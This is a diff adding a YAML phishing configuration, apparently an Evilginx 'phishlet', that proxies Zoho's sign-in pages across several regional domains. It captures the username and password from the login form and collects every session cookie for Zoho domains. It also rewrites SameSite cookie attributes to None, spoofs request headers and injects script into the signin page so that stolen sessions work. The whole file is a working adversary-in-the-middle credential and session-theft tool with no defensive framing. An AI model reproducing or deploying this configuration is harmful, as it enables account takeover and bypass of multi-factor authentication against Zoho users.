@@ -1,0 +1,62 @@
+name: 'zoho'
+author: 'your_alias'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - { phish_sub: 'accounts', orig_sub: 'accounts', domain: 'zoho.com', session: true, is_landing: true, auto_filter: true }
+  - { phish_sub: 'static', orig_sub: 'static', domain: 'zohocdn.com', session: false, auto_filter: true }
+  - { phish_sub: 'js', orig_sub: 'js', domain: 'zohocdn.com', session: false, auto_filter: true }
+  # - { phish_sub: 'static', orig_sub: 'static', domain: 'zohocdn.com', session: false, auto_filter: true }
+  - { phish_sub: 'accounts', orig_sub: 'accounts', domain: 'zoho.uk', session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: 'accounts', orig_sub: 'accounts', domain: 'zoho.in', session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: 'accounts', orig_sub: 'accounts', domain: 'zoho.jp', session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: 'accounts', orig_sub: 'accounts', domain: 'zoho.eu', session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: '', orig_sub: 'accounts', domain: 'zoho.com.au', session: true, is_landing: false, auto_filter: true }
+
+
+sub_filters:
+  - { triggers_on: 'accounts.zoho.com', orig_sub: 'accounts', domain: 'zoho.com', search: '(?i)SameSite=(Lax|Strict)', replace: 'SameSite=None', mimes: ['text/html','application/javascript','application/json','text/plain'] }
+  - { triggers_on: 'accounts.zoho.eu', orig_sub: 'accounts', domain: 'zoho.eu', search: '(?i)SameSite=(Lax|Strict)', replace: 'SameSite=None', mimes: ['text/html','application/javascript','application/json','text/plain'] }
+  - { triggers_on: 'accounts.zoho.uk', orig_sub: 'accounts', domain: 'zoho.uk', search: '(?i)SameSite=(Lax|Strict)', replace: 'SameSite=None', mimes: ['text/html','application/javascript','application/json','text/plain'] }
+  - { triggers_on: 'accounts.zoho.jp', orig_sub: 'accounts', domain: 'zoho.jp', search: '(?i)SameSite=(Lax|Strict)', replace: 'SameSite=None', mimes: ['text/html','application/javascript','application/json','text/plain'] }
+  - { triggers_on: 'accounts.zoho.in', orig_sub: 'accounts', domain: 'zoho.in', search: '(?i)SameSite=(Lax|Strict)', replace: 'SameSite=None', mimes: ['text/html','application/javascript','application/json','text/plain'] }
+  - { triggers_on: 'zoho.com.au', orig_sub: '', domain: 'zoho.com.au', search: '(?i)SameSite=(Lax|Strict)', replace: 'SameSite=None', mimes: ['text/html','application/javascript','application/json','text/plain'] }
+
+auth_tokens:
+  - domain: '.zoho.com'
+    keys: ['*']
+  - domain: '.zoho.*'
+    keys: ['*']
+
+credentials:
+  username:
+    key: 'lookupId'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwordauth.password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'accounts.zoho.com'
+  path: '/signin'
+
+inject_headers:
+  - domain: 'accounts.zoho.com'
+    headers:
+      - key: 'Sec-Fetch-Site'
+        value: 'same-origin'
+      - key: 'Referer'
+        value: 'https://accounts.zoho.com/signin'
+      - key: 'Referrer-Policy'
+        value: 'no-referrer-when-downgrade'
+
+js_inject:
+  - trigger_domains: ['accounts.zoho.com']
+    trigger_paths: ['/signin']
+    script: |
+      document.cookie = "zoho_check=true; path=/; SameSite=None; Secure";
+      Object.defineProperty(navigator, 'cookieEnabled', {
+        get: function() { return true; }
+      });
